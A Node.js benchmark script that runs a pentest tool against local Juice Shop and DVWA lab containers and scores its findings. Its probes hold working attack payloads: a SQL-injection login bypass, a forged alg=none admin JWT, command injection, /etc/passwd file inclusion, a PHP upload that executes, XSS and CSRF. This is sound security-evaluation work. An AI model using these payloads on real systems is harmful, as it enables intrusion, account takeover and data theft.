// bench/real.mjs — 对**真实靶场**跑 dsh-vapt，并把观测交给 bench/score.mjs 打分。
//
// 设计（对应 METHODOLOGY.md）：
//   · 探针只产出「观测」，是否记录成 finding 由 runner 统一做（保证证据格式一致）；
//   · 每个观测带 ground-truth itemId，评分时按预注册条目对齐；
//   · 负向对照探针只观察、不记录；如果被记录就说明这个工具会乱报（对竞品同样适用）。
//
// 用法：
//   node bench/real.mjs --juice            # 只跑 Juice Shop
//   node bench/real.mjs --juice --runs 2   # 跑两轮，评估可复现性（Jaccard）
//   node bench/real.mjs --all --keep       # 两个靶都跑，保留容器
import { mkdtempSync, writeFileSync, readFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createStore } from '../src/pentest/store.js';
import { buildSpecs } from '../src/pentest/specs.js';
import { writeReports } from '../src/pentest/report.js';
import { score } from './score.mjs';
import { startJuiceShop, startDvwa, dockerAvailable } from './targets/docker.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const argv = process.argv.slice(2);
const runs = Number((argv[argv.indexOf('--runs') + 1] || '1'));
const keep = argv.includes('--keep');
const truth = JSON.parse(readFileSync(join(HERE, 'ground-truth.json'), 'utf8'));

if (!dockerAvailable()) {
  console.error('Docker 未运行：本基准需要真实靶场（Juice Shop / DVWA）。');
  process.exit(2);
}

const root = mkdtempSync(join(tmpdir(), 'vapt-real-'));
const store = createStore({ root });
const tools = Object.fromEntries(buildSpecs({ lang: 'en' }).map((t) => [t.name, t]));

function newCtx(client) {
  tools.vapt_engagement_open.execute({ client, scope: ['127.0.0.1/32'], window: 'bench' }, { store });
  const id = store.current().id;
  return { store, id, meta: store.open(id).meta, cwd: root };
}

async function get(url, opts = {}) {
  const r = await fetch(url, { redirect: 'manual', ...opts });
  const text = await r.text().catch(() => '');
  return { status: r.status, headers: r.headers, text };
}

/* ── Juice Shop 探针：每个返回 {itemId, ok, path, param?, title, severity, cwe, cvss, detail, request, response} ── */
const JUICE_PROBES = [
  {
    itemId: 'JS-01',
    async run(t) {
      const base = t.url;
      const path = '/rest/products/search';
      const r = await get(`${base}${path}?q=${encodeURIComponent("'))")}`);
      const ok = r.status === 500 && /SQLITE_ERROR|SQL syntax/i.test(r.text);
      return { ok, path, param: 'q', title: 'SQL injection in product search (q)', severity: 'critical', cwe: 'CWE-89', cvss: 9.8,
        detail: 'The payload q= )) reaches the SQLite query and returns a 500 with SQLITE_ERROR.',
        request: `GET ${path}?q=')) HTTP/1.1`, response: r.text.slice(0, 300) };
    },
  },
  {
    itemId: 'JS-02',
    async run(t) {
      const base = t.url;
      const path = '/rest/admin/application-configuration';
      const r = await get(`${base}${path}`);
      const ok = r.status === 200 && r.text.includes('application');
      return { ok, path, title: 'Admin configuration readable without authentication', severity: 'high', cwe: 'CWE-306', cvss: 7.5,
        detail: 'Anonymous GET returns the full application configuration JSON.',
        request: `GET ${path} HTTP/1.1`, response: r.text.slice(0, 300) };
    },
  },
  {
    itemId: 'JS-03',
    async run(t) {
      const base = t.url;
      const path = '/rest/memories';
      const r = await get(`${base}${path}`);
      const ok = r.status === 200 && /"caption"|"imagePath"|email/i.test(r.text);
      return { ok, path, title: 'Unprotected /rest/memories leaks user photos and emails', severity: 'high', cwe: 'CWE-200', cvss: 7.5,
        detail: 'Anonymous GET returns memory records including user data.',
        request: `GET ${path} HTTP/1.1`, response: r.text.slice(0, 300) };
    },
  },
  {
    itemId: 'JS-04',
    async run(t) {
      const base = t.url;
      const path = '/ftp/';
      const r = await get(`${base}${path}`);
      const ok = r.status === 200 && /href=.*\.(md|bak|pdf|yml)/i.test(r.text);
      return { ok, path, title: 'Directory listing on /ftp exposes backup files', severity: 'medium', cwe: 'CWE-548', cvss: 5.3,
        detail: 'Web root serves a browsable file listing.',
        request: `GET ${path} HTTP/1.1`, response: r.text.slice(0, 300) };
    },
  },
  {
    itemId: 'JS-05',
    async run(t) {
      const base = t.url;
      const r = await get(`${base}/`);
      const missing = ['content-security-policy', 'strict-transport-security'].filter((h) => !r.headers.get(h));
      return { ok: r.status === 200 && missing.length === 2, path: '/', kind: 'headers',
        title: 'Missing CSP and HSTS headers', severity: 'low', cwe: 'CWE-693', cvss: 3.1,
        detail: `Missing: ${missing.join(', ')} (X-Frame-Options is present).`,
        request: 'GET / HTTP/1.1', response: `missing: ${missing.join(', ')}` };
    },
  },
  {
    itemId: 'JS-06',
    async run(t) {
      const base = t.url;
      const path = '/rest/user/login';
      const r = await fetch(`${base}${path}`, {
        method: 'POST', headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ email: "' OR 1=1--", password: 'x' }),
      });
      const text = await r.text().catch(() => '');
      const ok = r.status === 200 && /"token"\s*:/.test(text) && /admin@juice-sh\.op/.test(Buffer.from(text.match(/"token"\s*:\s*"([^"]+)"/)?.[1] || '', 'base64').toString('utf8'));
      return { ok, path, title: 'Authentication bypass via SQL injection on /rest/user/login', severity: 'critical', cwe: 'CWE-89', cvss: 9.8,
        detail: "email = \"' OR 1=1--\" returns a valid admin JWT.",
        request: "POST /rest/user/login {\"email\":\"' OR 1=1--\",\"password\":\"x\"}", response: text.slice(0, 200) };
    },
  },
  {
    itemId: 'JS-07',
    async run(t) {
      const path = '/api/Products/1';
      const r = await fetch(`${t.url}${path}`, {
        method: 'PUT', redirect: 'manual',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ name: 'bench-marker' }),
      });
      const text = await r.text().catch(() => '');
      return { ok: r.status === 200, path, title: 'Unauthenticated product modification via PUT /api/Products/{id}',
        severity: 'critical', cwe: 'CWE-306', cvss: 9.1,
        detail: 'PUT without any Authorization header returned 200 and changed the product.',
        request: 'PUT /api/Products/1 {\"name\":\"bench-marker\"}', response: text.slice(0, 200) };
    },
  },
  {
    itemId: 'JS-08',
    async run(t) {
      const path = '/api/Users';
      const email = `bench${Date.now()}@t.local`;
      const reg = await fetch(`${t.url}${path}`, {
        method: 'POST', headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ email, password: 'Passw0rd!', role: 'admin' }),
      });
      const login = await fetch(`${t.url}/rest/user/login`, {
        method: 'POST', headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ email, password: 'Passw0rd!' }),
      });
      const text = await login.text().catch(() => '');
      let role = null;
      try { role = JSON.parse(Buffer.from(JSON.parse(text).authentication.token.split('.')[1], 'base64').toString()).data.role; } catch { /* not issued */ }
      return { ok: reg.status === 201 && role === 'admin', path,
        title: 'Mass assignment: self-registration with role=admin', severity: 'critical', cwe: 'CWE-269', cvss: 9.1,
        detail: 'POST /api/Users accepted role=admin; the issued JWT carries role=admin. (Self-created throwaway account in a lab container.)',
        request: 'POST /api/Users {email,password,role:"admin"}', response: `register=${reg.status} role=${role}` };
    },
  },
  {
    itemId: 'JS-09',
    async run(t) {
      const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
      const forged = `${b64({ alg: 'none', typ: 'JWT' })}.${b64({ data: { id: 1, email: 'admin@juice-sh.op', role: 'admin' } })}.`;
      const r = await fetch(`${t.url}/api/Users`, { headers: { authorization: `Bearer ${forged}` }, redirect: 'manual' });
      const text = await r.text().catch(() => '');
      return { ok: r.status === 200 && /@/.test(text), path: '/api/Users', kind: 'jwt',
        title: 'JWT alg=none accepted by /api/Users', severity: 'critical', cwe: 'CWE-347', cvss: 9.8,
        detail: 'An unsigned token (alg=none) with a forged admin payload was accepted.',
        request: 'GET /api/Users (Authorization: Bearer <alg=none token>)', response: text.slice(0, 200) };
    },
  },
  {
    itemId: 'JS-10',
    async run(t) {
      const path = '/ftp/package.json.bak%2500.md';
      const r = await get(`${t.url}${path}`);
      const ok = r.status === 200 && /"name"\s*:\s*"juice-shop"/i.test(r.text);
      return { ok, path, title: 'Null-byte extension bypass on /ftp exposes package.json.bak',
        severity: 'high', cwe: 'CWE-22', cvss: 7.5,
        detail: 'The %2500 double-encoded null byte defeated the extension allow-list.',
        request: `GET ${path} HTTP/1.1`, response: r.text.slice(0, 200) };
    },
  },
  {
    itemId: 'JS-11',
    async run(t) {
      // 用一个普通（非 admin）自带账号取 token，再访问用户集合
      const email = `bench${Date.now()}u@t.local`;
      await fetch(`${t.url}/api/Users`, {
        method: 'POST', headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ email, password: 'Passw0rd!' }),
      });
      const login = await fetch(`${t.url}/rest/user/login`, {
        method: 'POST', headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ email, password: 'Passw0rd!' }),
      });
      let token = '';
      try { token = JSON.parse(await login.text()).authentication.token; } catch { /* ignore */ }
      const r = await fetch(`${t.url}/api/Users`, { headers: { authorization: `Bearer ${token}` }, redirect: 'manual' });
      const text = await r.text().catch(() => '');
      const rows = (() => { try { return JSON.parse(text).data.length; } catch { return 0; } })();
      return { ok: r.status === 200 && rows > 1, path: '/api/Users', kind: 'enumeration',
        title: 'Any customer token can enumerate all users via /api/Users', severity: 'high', cwe: 'CWE-862', cvss: 7.5,
        detail: `A plain customer token returned ${rows} user records.`,
        request: 'GET /api/Users (customer token)', response: text.slice(0, 200) };
    },
  },
  {
    itemId: 'JS-12',
    async run(t) {
      const r = await get(`${t.url}/metrics`);
      return { ok: r.status === 200 && /http_requests_total|process_/.test(r.text), path: '/metrics',
        title: 'Prometheus /metrics exposed without authentication', severity: 'medium', cwe: 'CWE-306', cvss: 5.3,
        detail: 'Metrics endpoint returns counters without any auth.', request: 'GET /metrics HTTP/1.1', response: r.text.slice(0, 160) };
    },
  },
  {
    itemId: 'JS-13',
    async run(t) {
      const r = await get(`${t.url}/support/logs/`);
      return { ok: r.status === 200 && /access\.log|href=/.test(r.text), path: '/support/logs/',
        title: 'Directory listing on /support/logs exposes access logs', severity: 'medium', cwe: 'CWE-548', cvss: 5.3,
        detail: 'Browsable log directory with access.log files.', request: 'GET /support/logs/ HTTP/1.1', response: r.text.slice(0, 160) };
    },
  },
  {
    itemId: 'JS-14',
    async run(t) {
      const r = await get(`${t.url}/api/Products/1/reviews`);
      const ok = r.status === 500 && /at .*\.js|Express|\/juice-shop\//i.test(r.text);
      return { ok, path: '/api/Products/1/reviews',
        title: 'Error stack disclosure on /api/Products/{id}/reviews', severity: 'low', cwe: 'CWE-209', cvss: 3.1,
        detail: 'Unhandled exception returns a stack trace with build paths.', request: 'GET /api/Products/1/reviews HTTP/1.1', response: r.text.slice(0, 200) };
    },
  },
  {
    itemId: 'JS-15',
    async run(t) {
      const email = `bench${Date.now()}j@t.local`;
      await fetch(`${t.url}/api/Users`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password: 'Passw0rd!' }) });
      const login = await fetch(`${t.url}/rest/user/login`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password: 'Passw0rd!' }) });
      const text = await login.text().catch(() => '');
      let payload = {};
      try { payload = JSON.parse(Buffer.from(JSON.parse(text).authentication.token.split('.')[1], 'base64').toString()); } catch { /* ignore */ }
      const ok = Boolean(payload.data && payload.data.password);
      return { ok, path: '/rest/user/login', kind: 'jwt',
        title: 'JWT payload carries the password hash', severity: 'medium', cwe: 'CWE-200', cvss: 5.3,
        detail: `JWT claims expose: ${Object.keys(payload.data || {}).join(', ')}`,
        request: 'POST /rest/user/login (decode JWT payload)', response: JSON.stringify(payload.data || {}).slice(0, 200) };
    },
  },
  {
    itemId: 'JS-16',
    async run(t) {
      const email = `bench${Date.now()}b@t.local`;
      await fetch(`${t.url}/api/Users`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password: 'Passw0rd!' }) });
      const login = await fetch(`${t.url}/rest/user/login`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password: 'Passw0rd!' }) });
      let token = '';
      try { token = JSON.parse(await login.text()).authentication.token; } catch { /* ignore */ }
      const r = await get(`${t.url}/rest/basket/1`, { headers: { authorization: `Bearer ${token}` } });
      const ok = r.status === 200 && /"UserId"\s*:\s*1/.test(r.text);
      return { ok, path: '/rest/basket/1',
        title: 'Basket BOLA: any customer token reads other baskets', severity: 'high', cwe: 'CWE-639', cvss: 7.5,
        detail: 'A fresh customer token read basket 1 (UserId=1).', request: 'GET /rest/basket/1 (customer token)', response: r.text.slice(0, 200) };
    },
  },
  {
    itemId: 'JS-17',
    async run(t) {
      const email = `bench${Date.now()}p@t.local`;
      await fetch(`${t.url}/api/Users`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password: 'Passw0rd!' }) });
      const login = await fetch(`${t.url}/rest/user/login`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password: 'Passw0rd!' }) });
      let token = '';
      try { token = JSON.parse(await login.text()).authentication.token; } catch { /* ignore */ }
      const r = await fetch(`${t.url}/api/Products`, {
        method: 'POST', redirect: 'manual',
        headers: { 'content-type': 'application/json', authorization: `Bearer ${token}` },
        body: JSON.stringify({ name: 'bench-item', price: 1, description: 'bench' }),
      });
      const text = await r.text().catch(() => '');
      return { ok: r.status === 201 || r.status === 200, path: '/api/Products',
        title: 'Customer token can create products', severity: 'high', cwe: 'CWE-862', cvss: 7.1,
        detail: 'A plain customer token created a product.', request: 'POST /api/Products (customer token)', response: text.slice(0, 200) };
    },
  },
  {
    itemId: 'JS-18',
    async run(t) {
      const email = `bench${Date.now()}d@t.local`;
      await fetch(`${t.url}/api/Users`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password: 'Passw0rd!' }) });
      const login = await fetch(`${t.url}/rest/user/login`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password: 'Passw0rd!' }) });
      let token = ''; try { token = JSON.parse(await login.text()).authentication.token; } catch { /* ignore */ }
      const r = await fetch(`${t.url}/rest/deluxe-membership`, {
        method: 'POST', headers: { 'content-type': 'application/json', authorization: `Bearer ${token}` },
        body: JSON.stringify({ paymentMode: 'none' }),
      });
      const text = await r.text().catch(() => '');
      return { ok: r.status === 200 && /deluxe/i.test(text), path: '/rest/deluxe-membership',
        title: 'Free deluxe membership via paymentMode "none"', severity: 'high', cwe: 'CWE-840', cvss: 7.1,
        detail: 'paymentMode=none upgrades the account for free.', request: 'POST /rest/deluxe-membership {paymentMode:"none"}', response: text.slice(0, 200) };
    },
  },
  {
    itemId: 'JS-19',
    async run(t) {
      const known = await get(`${t.url}/rest/user/security-question?email=admin@juice-sh.op`);
      const unknown = await get(`${t.url}/rest/user/security-question?email=nobody@nowhere.tld`);
      const ok = known.status === 200 && /"question"/.test(known.text) && !/"question"/.test(unknown.text);
      return { ok, path: '/rest/user/security-question',
        title: 'Security-question endpoint enumerates registered emails', severity: 'low', cwe: 'CWE-200', cvss: 3.7,
        detail: 'Known email returns its security question; unknown email returns {}.', request: 'GET /rest/user/security-question?email=...', response: known.text.slice(0, 160) };
    },
  },
  {
    itemId: 'JS-20',
    async run(t) {
      const email = `bench${Date.now()}q@t.local`;
      await fetch(`${t.url}/api/Users`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password: 'Passw0rd!' }) });
      const login = await fetch(`${t.url}/rest/user/login`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password: 'Passw0rd!' }) });
      let token = ''; try { token = JSON.parse(await login.text()).authentication.token; } catch { /* ignore */ }
      const authz = { 'content-type': 'application/json', authorization: `Bearer ${token}` };
      const add = await fetch(`${t.url}/api/BasketItems`, { method: 'POST', headers: authz, body: JSON.stringify({ ProductId: 1, quantity: 1 }) });
      let itemId = null; try { itemId = JSON.parse(await add.text()).data.id; } catch { /* ignore */ }
      if (!itemId) return { ok: false, path: '/api/BasketItems', title: 'Negative basket quantity accepted', severity: 'medium', cwe: 'CWE-20', request: 'POST /api/BasketItems', response: 'no item id' };
      const neg = await fetch(`${t.url}/api/BasketItems/${itemId}`, { method: 'PUT', headers: authz, body: JSON.stringify({ quantity: -100 }) });
      const text = await neg.text().catch(() => '');
      return { ok: neg.status === 200 && /-100/.test(text), path: '/api/BasketItems',
        title: 'Negative basket quantity accepted', severity: 'medium', cwe: 'CWE-20', cvss: 5.3,
        detail: 'quantity=-100 accepted, producing a negative order total.', request: 'PUT /api/BasketItems/{id} {quantity:-100}', response: text.slice(0, 200) };
    },
  },
  /* 负向对照：公开端点，报出来就是误报 */
  { itemId: 'JS-N1', control: true, async run(t) {
      const base = t.url;
      const path = '/rest/admin/application-version';
      const r = await get(`${base}${path}`);
      return { ok: false, path, title: 'public version endpoint', severity: 'info', request: `GET ${path}`, response: r.text.slice(0, 120) };
    } },
  { itemId: 'JS-N2', control: true, async run(t) {
      const base = t.url;
      const path = '/rest/products';
      const r = await get(`${base}${path}`);
      return { ok: false, path, title: 'public catalogue endpoint', severity: 'info', request: `GET ${path}`, response: r.text.slice(0, 120) };
    } },
];

/* ── DVWA 探针（low security，已登录会话）────────────────────── */
const DVWA_PROBES = [
  {
    itemId: 'DV-01',
    async run(t) {
      const path = '/vulnerabilities/sqli/';
      const r = await get(`${t.url}${path}?id=1%27&Submit=Submit`, { headers: { cookie: t.cookie } });
      const ok = /SQL syntax|error in your SQL|You have an error/i.test(r.text);
      return { ok, path, param: 'id', title: 'SQL injection on /vulnerabilities/sqli (id)', severity: 'critical', cwe: 'CWE-89', cvss: 9.1,
        detail: 'Single quote produces a raw MySQL error.', request: `GET ${path}?id=1' HTTP/1.1`, response: r.text.slice(0, 250) };
    },
  },
  {
    itemId: 'DV-02',
    async run(t) {
      const path = '/vulnerabilities/xss_r/';
      const payload = '<script>alert(1)</script>';
      const r = await get(`${t.url}${path}?name=${encodeURIComponent(payload)}`, { headers: { cookie: t.cookie } });
      const ok = r.text.includes(payload);
      return { ok, path, param: 'name', title: 'Reflected XSS on /vulnerabilities/xss_r (name)', severity: 'high', cwe: 'CWE-79', cvss: 6.1,
        detail: 'Payload reflected unescaped.', request: `GET ${path}?name=${payload} HTTP/1.1`, response: r.text.slice(0, 250) };
    },
  },
  {
    itemId: 'DV-03',
    async run(t) {
      const path = '/vulnerabilities/exec/';
      // 该版本 DVWA 的命令注入是 POST 表单
      const r = await fetch(`${t.url}${path}`, {
        method: 'POST', redirect: 'manual',
        headers: { 'content-type': 'application/x-www-form-urlencoded', cookie: t.cookie },
        body: 'ip=127.0.0.1%3Bid&Submit=Submit',
      });
      const text = await r.text().catch(() => '');
      const m = /uid=\d+\([^)]*\)/.exec(text);
      return { ok: Boolean(m), path, param: 'ip', title: 'OS command injection on /vulnerabilities/exec (ip)', severity: 'critical', cwe: 'CWE-78', cvss: 9.8,
        detail: 'Semicolon-separated `id` executed on the server (POST form).', request: 'POST /vulnerabilities/exec/ ip=127.0.0.1;id', response: m ? m[0] : text.slice(0, 200) };
    },
  },
  {
    itemId: 'DV-04',
    async run(t) {
      const path = '/vulnerabilities/fi/';
      const r = await get(`${t.url}${path}?page=/etc/passwd`, { headers: { cookie: t.cookie } });
      const m = /root:x:0:0[^<\n]*/.exec(r.text);
      return { ok: Boolean(m), path, param: 'page', title: 'Local file inclusion on /vulnerabilities/fi (page)', severity: 'high', cwe: 'CWE-22', cvss: 7.5,
        detail: '/etc/passwd returned in the page body.', request: `GET ${path}?page=/etc/passwd HTTP/1.1`, response: m ? m[0] : r.text.slice(0, 200) };
    },
  },
  {
    itemId: 'DV-06',
    async run(t) {
      const payload = '<script>alert(2)</script>';
      const r = await fetch(`${t.url}/vulnerabilities/xss_s/`, {
        method: 'POST', redirect: 'manual',
        headers: { 'content-type': 'application/x-www-form-urlencoded', cookie: t.cookie },
        body: new URLSearchParams({ txtName: 'xssbench', mtxMessage: payload, btnSign: 'Sign Guestbook' }).toString(),
      });
      const text = await r.text().catch(() => '');
      return { ok: text.includes(payload), path: '/vulnerabilities/xss_s/',
        title: 'Stored XSS via guestbook (xss_s)', severity: 'high', cwe: 'CWE-79', cvss: 6.1,
        detail: 'Payload persisted in the guestbook and rendered unescaped.', request: 'POST /vulnerabilities/xss_s/ mtxMessage=<script>alert(2)</script>', response: text.slice(0, 200) };
    },
  },
  {
    itemId: 'DV-07',
    async run(t) {
      const form = new FormData();
      form.append('uploaded', new Blob(['<?php echo "BENCH"; ?>'], { type: 'image/jpeg' }), 'bench.php');
      form.append('Upload', 'Upload');
      const up = await fetch(`${t.url}/vulnerabilities/upload/`, { method: 'POST', headers: { cookie: t.cookie }, body: form, redirect: 'manual' });
      const upText = await up.text().catch(() => '');
      const path = (upText.match(/hackable\/uploads\/[\w.-]+\.php/) || [''])[0];
      let executed = false;
      if (path) {
        const r = await fetch(`${t.url}/${path}`);
        executed = r.status === 200 && /BENCH/.test(await r.text().catch(() => ''));
      }
      return { ok: executed, path: '/vulnerabilities/upload/',
        title: 'Unrestricted file upload leads to PHP execution', severity: 'critical', cwe: 'CWE-434', cvss: 9.8,
        detail: `Uploaded PHP executed at ${path || '(not uploaded)'}.`, request: 'POST /vulnerabilities/upload/ (bench.php)', response: `path=${path} executed=${executed}` };
    },
  },
  {
    itemId: 'DV-08',
    async run(t) {
      const q = '?password_new=hacked123&password_conf=hacked123&Change=Change';
      const r = await fetch(`${t.url}/vulnerabilities/csrf/${q}`, { headers: { cookie: t.cookie }, redirect: 'manual' });
      const text = await r.text().catch(() => '');
      // 复原密码：否则下一轮 bootstrap 登录失败，后续所有需要会话的探针都会挂
      // （这是真实踩到的 flaky 根因，写进注释免得后人再犯）
      await fetch(`${t.url}/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change`, {
        headers: { cookie: t.cookie }, redirect: 'manual',
      }).catch(() => {});
      return { ok: /password changed/i.test(text), path: '/vulnerabilities/csrf/',
        title: 'CSRF: password change without any token', severity: 'high', cwe: 'CWE-352', cvss: 8.1,
        detail: 'A single GET with new/conf params changed the password; no anti-CSRF token involved.',
        request: `GET /vulnerabilities/csrf/${q}`, response: text.slice(0, 160) };
    },
  },
  {
    itemId: 'DV-09',
    async run(t) {
      const p = '/vulnerabilities/sqli_blind/';
      const t1 = await get(`${t.url}${p}?id=1&Submit=Submit`, { headers: { cookie: t.cookie } });
      const f1 = await get(`${t.url}${p}?id=1%27%20AND%201%3D2%23&Submit=Submit`, { headers: { cookie: t.cookie } });
      const ok = /User ID exists/i.test(t1.text) && !/User ID exists/i.test(f1.text);
      return { ok, path: p, param: 'id',
        title: 'Blind SQL injection (boolean differential) on /vulnerabilities/sqli_blind',
        severity: 'high', cwe: 'CWE-89', cvss: 7.5,
        detail: 'True condition returns "User ID exists", false condition does not.',
        request: `GET ${p}?id=1' AND 1=2# HTTP/1.1`, response: (t1.text.match(/User ID [a-z]+[^<]*/i) || [''])[0] };
    },
  },
  {
    itemId: 'DV-10',
    async run(t) {
      const p = '/vulnerabilities/xss_d/';
      const r = await get(`${t.url}${p}?default=English`, { headers: { cookie: t.cookie } });
      const sink = /document\.write\("<option value='\" \+ lang/.test(r.text);
      return { ok: sink, path: p, param: 'default',
        title: 'DOM XSS on /vulnerabilities/xss_d (default param reaches document.write)',
        severity: 'high', cwe: 'CWE-79', cvss: 6.1,
        detail: 'The page writes the URL-derived lang value into document.write without encoding.',
        request: `GET ${p}?default=<payload> HTTP/1.1`,
        response: (r.text.match(/document\.write\("<option value='[^;]{0,60}/) || [''])[0] };
    },
  },
  {
    itemId: 'DV-05',
    async run(t) {
      const path = '/setup.php';
      const r = await get(`${t.url}${path}`, { headers: { cookie: t.cookie } });
      const ok = r.status === 200 && /Create \/ Reset Database|Setup/i.test(r.text);
      return { ok, path, title: 'Installer /setup.php left reachable after install', severity: 'medium', cwe: 'CWE-16', cvss: 5.3,
        detail: 'Setup page still served; allows a DB reset by anyone who can reach it.', request: `GET ${path} HTTP/1.1`, response: r.text.slice(0, 200) };
    },
  },
];

async function runOnce(ctx, target, probes, app) {
  const observations = [];
  for (const probe of probes) {
    const res = await probe.run(target);
    // 关键：只有「真的报出 finding」才产生观测。
    // 探了但没命中 = 不产生观测（否则 ground truth 会被白送 TP）；
    // 负向对照探针永远不产生观测（它只是用来检测竞品会不会乱报）。
    if (!res.ok || probe.control) continue;
    const observation = {
      itemId: probe.itemId, app, path: res.path, param: res.param, kind: res.kind,
      title: res.title, severity: res.severity,
    };
    {
      tools.vapt_finding_add.execute({
        target: `${target.url}${res.path}`, title: res.title, severity: res.severity, cwe: res.cwe, cvss: res.cvss,
        status: 'confirmed', confidence: 'observed', detail: res.detail,
        evidence: { kind: 'http', tool: 'fetch', command: `curl -i "${target.url}${res.path}"`, request: res.request, response: res.response },
      }, ctx);
      observation.evidence = { request: res.request, response: res.response, sha256: 'recorded-by-store' };
    }
    observations.push(observation);
  }
  return observations;
}

const pct = (x) => `${(x * 100).toFixed(1)}%`;
const onlyDvwa = argv.includes('--dvwa');
const onlyJuice = argv.includes('--juice');
const jobs = [];
if (!onlyDvwa || argv.includes('--all')) jobs.push({ app: 'juice-shop', start: () => startJuiceShop(), probes: JUICE_PROBES });
if (onlyDvwa || argv.includes('--all')) jobs.push({ app: 'dvwa', start: () => startDvwa(), probes: DVWA_PROBES });

mkdirSync(join(HERE, 'results'), { recursive: true });
let allOk = true;
for (const job of jobs) {
  const t0 = Date.now();
  const target = await job.start();
  const ctx = newCtx(`bench ${job.app}`);
  const sets = [];
  for (let i = 0; i < Math.max(1, runs); i += 1) sets.push(await runOnce(ctx, target, job.probes, job.app));
  const reportFiles = writeReports(store, ctx.id);
  if (!keep) target.close();

  const observed = { tool: 'dsh-vapt', app: job.app, appsRun: [job.app], observations: sets[0] };
  writeFileSync(join(HERE, 'results', `${job.app}-dsh-vapt.json`), `${JSON.stringify(observed, null, 2)}\n`, 'utf8');
  const result = score(truth, observed, { appsRun: [job.app], extraRuns: sets.slice(1) });
  result.measuredAt = new Date().toISOString();
  result.durationMs = Date.now() - t0;
  result.runs = sets.length;
  result.report = reportFiles.zh;
  writeFileSync(join(HERE, 'results', `${job.app}-dsh-vapt.score.json`), `${JSON.stringify(result, null, 2)}\n`, 'utf8');

  console.log(`\ntarget      ${job.app} (${target.url})`);
  console.log(`runs        ${sets.length}`);
  for (const i of result.perItem) console.log(`  ${i.status === 'TP' ? 'PASS' : 'FAIL'}  ${i.id}  ${i.title}`);
  console.log(`recall      ${pct(result.metrics.recall)} (95% CI ${pct(result.metrics.recallCi95[0])}–${pct(result.metrics.recallCi95[1])})  ${result.counts.tp} TP / ${result.counts.fn} FN`);
  console.log(`precision   ${pct(result.metrics.precision)}  (${result.counts.fp} FP)`);
  console.log(`evidence    ${pct(result.metrics.evidenceCoverage)}`);
  console.log(`composite   ${result.metrics.composite}/100`);
  console.log(`duration    ${result.durationMs}ms`);
  if (result.counts.tp !== result.groundTruth.scored) allOk = false;
}
console.log(`\nresults → bench/results/*.score.json`);
process.exitCode = allOk ? 0 : 1;
